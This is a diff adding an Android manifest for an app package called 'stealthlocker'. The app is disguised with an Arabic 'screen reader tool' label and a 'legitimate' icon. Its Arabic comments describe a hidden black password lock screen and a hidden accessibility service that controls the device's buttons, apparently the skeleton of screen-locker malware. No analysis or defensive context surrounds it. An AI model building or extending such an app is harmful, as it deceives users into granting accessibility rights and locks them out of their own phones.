@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.example.stealthlocker">
+
+    <application
+        android:icon="@drawable/legitimate_app_icon"
+        android:label="أداة قراءة الشاشة"
+        android:theme="@style/Theme.AppCompat.NoActionBar">
+
+        <!-- الواجهة الأولى التي تفتح عند النقر على التطبيق -->
+        <activity android:name=".MainActivity" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- شاشة القفل السوداء المخفية -->
+        <activity android:name=".PasswordLockActivity" android:exported="false" />
+
+        <!-- الخدمة الخفية التي تتحكم بالأزرار -->
+        <service
+            android:name=".MyAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config" />
+        </service>
+
+    </application>
+</manifest>
+
